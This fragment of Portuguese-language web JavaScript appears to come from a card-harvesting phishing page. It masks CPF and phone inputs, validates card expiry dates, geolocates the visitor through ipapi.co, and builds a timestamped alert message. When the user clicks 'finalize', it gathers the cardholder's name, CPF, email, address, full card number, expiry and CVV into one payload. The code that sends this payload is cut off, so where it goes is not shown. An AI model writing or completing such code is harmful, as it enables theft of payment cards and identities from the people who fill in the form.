...
document.addEventListener('DOMContentLoaded',function(){
    ...
    ['cardTelefone','telefone'].forEach(fieldId=>{
        const field=document.getElementById(fieldId);
        if(field){
            field.addEventListener('input',function(e){
                let value=e.target.value.replace(/\D/g,'');
    ...
    ['cardCpf','cpf'].forEach(fieldId=>{
        const field=document.getElementById(fieldId);
        if(field){
            field.addEventListener('input',function(e){
                let value=e.target.value.replace(/\D/g,'');
                if(value.length>=11) value=value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
                else if(value.length>=9) value=value.replace(/(\d{3})(\d{3})(\d{3})/,'$1.$2.$3');
                else if(value.length>=6) value=value.replace(/(\d{3})(\d{3})/,'$1.$2');
    ...
    function validarValidade(validade){
        ...
        const mesNum=parseInt(mes,10),anoNum=parseInt(ano,10);
        const anoAtual=new Date().getFullYear()%100,mesAtual=new Date().getMonth()+1;
    ...
    let userCity='';
    fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{userCity=d.city||'';}).catch(()=>{});
...
⏰ Data: ${new Date().toLocaleString('pt-BR')}`;
    ...
    if(finalizarCartaoBtn){
        finalizarCartaoBtn.addEventListener('click',async function(e){
            ...
            const temComplemento=!!document.getElementById('temComplementoCard')?.checked;
            ...
            const dadosEnvio={
                titular,telefone,email,cpf,numero,validade,cvv,
                cep,rua,numeroEnd,complemento,
